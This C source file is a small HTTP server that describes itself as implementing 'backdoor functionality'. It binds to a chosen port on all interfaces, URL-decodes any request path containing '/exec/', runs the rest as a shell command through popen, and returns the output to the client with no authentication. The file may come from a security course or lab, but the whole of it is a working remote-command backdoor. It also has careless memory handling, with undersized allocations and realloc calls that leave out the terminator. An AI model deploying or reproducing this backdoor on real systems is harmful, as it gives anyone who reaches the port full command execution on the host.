#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <ctype.h>


// https://stackoverflow.com/questions/779875/what-is-the-function-to-replace-string-in-c
char * replace(
    char const * const original, 
    char const * const pattern, 
    char const * const replacement
) {
  size_t const replen = strlen(replacement);
  size_t const patlen = strlen(pattern);
  size_t const orilen = strlen(original);

  size_t patcnt = 0;
  const char * oriptr;
  const char * patloc;

  // find how many times the pattern occurs in the original string
  for (oriptr = original; patloc = strstr(oriptr, pattern); oriptr = patloc + patlen)
  {
    patcnt++;
  }

  {
    // allocate memory for the new string
    size_t const retlen = orilen + patcnt * (replen - patlen);
    char * const returned = (char *) malloc( sizeof(char) * (retlen + 1) );

    if (returned != NULL)
    {
      // copy the original string, 
      // replacing all the instances of the pattern
      char * retptr = returned;
      for (oriptr = original; patloc = strstr(oriptr, pattern); oriptr = patloc + patlen)
      {
        size_t const skplen = patloc - oriptr;
        // copy the section until the occurence of the pattern
        strncpy(retptr, oriptr, skplen);
        retptr += skplen;
        // copy the replacement 
        strncpy(retptr, replacement, replen);
        retptr += replen;
      }
      // copy the rest of the string.
      strcpy(retptr, oriptr);
    }
    return returned;
  }
}

//https://stackoverflow.com/questions/2673207/c-c-url-decode-library
void decodehex(char *dst, const char *src)
{
        char a, b;
        while (*src) {
                if ((*src == '%') &&
                    ((a = src[1]) && (b = src[2])) &&
                    (isxdigit(a) && isxdigit(b))) {
                        if (a >= 'a')
                                a -= 'a'-'A';
                        if (a >= 'A')
                                a -= ('A' - 10);
                        else
                                a -= '0';
                        if (b >= 'a')
                                b -= 'a'-'A';
                        if (b >= 'A')
                                b -= ('A' - 10);
                        else
                                b -= '0';
                        *dst++ = 16*a+b;
                        src+=3;
                } else if (*src == '+') {
                        *dst++ = ' ';
                        src++;
                } else {
                        *dst++ = *src++;

                }
        }
        *dst++ = '\0';
}



int main(int argc, char *argv[]){
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	char response404[]=
	"HTTP/1.1 404 Not Found\r\n"
	"Content-Type: text/html; charset=UTF-8\r\n\r\n"
	"404 Not Found\r\n";

	char response200[]=
	"HTTP/1.1 200 OK\r\n"
	"Content-Type: text/html; charset=UTF-8\r\n\r\n";

	char illegalcommand[]="illegal command/ command not found\r\n";
	
	// to check for proper URL. 
	char *precommand="GET";
	char *postcommand ="HTTP/1.1";

	int port;

	if(argc!=2){
		printf("Usage %s <port-num>\n",argv[0]);
		exit(1);
	}
	port = atoi(argv[1]);

	struct sockaddr_in server_addr, client_addr;
	socklen_t sin_len=sizeof(client_addr);
	int fd_server, fd_client;
	char buf[2048],temp[2014],ch;
	int on=1;
	char *cmd,*source=NULL;
	FILE *fp;
	char line[128];
	 // Buffer to store the string
	unsigned int size=0;


	// initialization part. 
	fd_server=socket(AF_INET,SOCK_STREAM,0);

	if (fd_server<0){
		perror("socket malfunction");
		exit(1);
	}

	setsockopt(fd_server,SOL_SOCKET,SO_REUSEADDR ,&on,sizeof(int));

	server_addr.sin_family=AF_INET;
	server_addr.sin_addr.s_addr=INADDR_ANY;
	server_addr.sin_port=htons(port);

	if(bind(fd_server,(struct sockaddr *)&server_addr,sizeof(server_addr))==-1){
		perror("bind malfunction");
		close(fd_server);
		exit(1);
	}

	if(listen(fd_server,50)==-1){
		perror("listen");
		close(fd_server);
		exit(1);
	}
	// all initializations done. 

	while(1){
		char* buffer=(char *)malloc(1*sizeof(char));

		printf("accepting the connection...");

		fd_client=accept(fd_server,(struct sockaddr *)&client_addr, &sin_len);
		
		if(fd_client== -1){
			perror("connection failed..\n");
			continue;
		}


		printf("connection successful\n");

		if(1){
			printf("inside if..");
			// child process implement the backdoor functionality

			//close(fd_server);
			memset(buf,0,sizeof(buf));

			//read from the client socket
			read(fd_client,buf,sizeof(buf)-1);
			//char *newbuf = (char *) malloc(strlen(buf)*sizeof(char));
			//decodehex(newbuf,buf);

			printf("new decoded buffer is %s\n",buf);

			printf("%s:\n","Message");
			printf("%s\n",buf);

			//check for 404 errors.
			if( (strstr(buf,precommand)==NULL) || (strstr(buf,postcommand)==NULL)){
				//send 404 response packet the exit.
				//write(fd_client,response404,sizeof(response404)-1);
				
				if(send(fd_client , response404 , strlen(response404),0) == -1)
		        {
		            printf("%s\n","Error sending msg" );
		            perror("error sending msg");
		            exit(EXIT_FAILURE);
        		} 

				close(fd_client);
				//exit(0);

			} 
			else{//send 200 response.

				//extract the command.

				cmd = strtok(buf+4," ");
				printf("cmd is now %s\n",cmd);
				
				//To decode the commmand if any hex value is present.
				char *newcmd = (char *) malloc(strlen(cmd)*sizeof(char));
				decodehex(newcmd,cmd);

				if (strstr(newcmd, "/exec/")==NULL){
					if(send(fd_client , response404 , strlen(response404),0) == -1)
			        {
			            printf("%s\n","Error sending msg" );
			            perror("error sending msg");
			            exit(EXIT_FAILURE);
	        		} 

					close(fd_client);
					continue;

				}
				//newcmd=newcmd+6;

				//newcmd now contains command to execute.
				//newcmd=replace(cmdDecoded,"%20"," ");

				printf("command to execute: %s\n",newcmd);

				//copy the first two lines of packet.
				size=strlen(response200);
				strcat(buffer=realloc(buffer,size),response200);
				strcat(newcmd," 2>&1");

				fp=popen(newcmd+6,"r");

				while (fgets(line,sizeof(line),fp))
				    {
					    size+=strlen(line);
					    strcat(buffer=realloc(buffer,size),line);
				    }
				
				strcat(buffer,"\0");

				//write(fd_client,buffer,strlen(buffer)-1);
				if(send(fd_client , buffer , strlen(buffer),0) == -1)
		        {
		            printf("%s\n","Error sending msg" );
		            perror("error sending msg");
		            exit(EXIT_FAILURE);
        		} 
				close(fd_client);
				free(buffer);
				free(newcmd);
				//exit(0);
			}

		}

	} //end of while.
	return 0;
} // end of main.
